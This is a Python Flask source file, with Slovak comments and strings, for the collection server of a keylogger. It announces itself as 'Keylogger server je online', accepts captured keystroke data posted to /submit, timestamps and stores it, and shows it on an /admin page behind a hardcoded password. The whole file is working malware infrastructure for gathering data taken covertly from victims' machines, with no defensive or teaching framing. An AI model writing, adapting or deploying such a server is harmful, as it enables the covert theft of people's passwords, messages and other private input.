from flask import Flask, request, render_template
from datetime import datetime

app = Flask(__name__)
PASSWORD = "120202810428Jm!"  # nastav si vlastné heslo
DATA = []

@app.route('/')
def home():
    return "✅ Keylogger server je online."

@app.route('/submit', methods=['POST'])
def submit():
    json_data = request.json
    json_data['timestamp'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    DATA.append(json_data)
    return {"status": "received"}

@app.route('/admin', methods=['GET', 'POST'])
def admin():
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            return render_template("admin.html", data=DATA)
        else:
            return "Zlé heslo", 403
    return '''
        <form method="post">
            Heslo: <input type="password" name="password" required>
            <input type="submit" value="Prihlásiť sa">
        </form>
    '''

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)


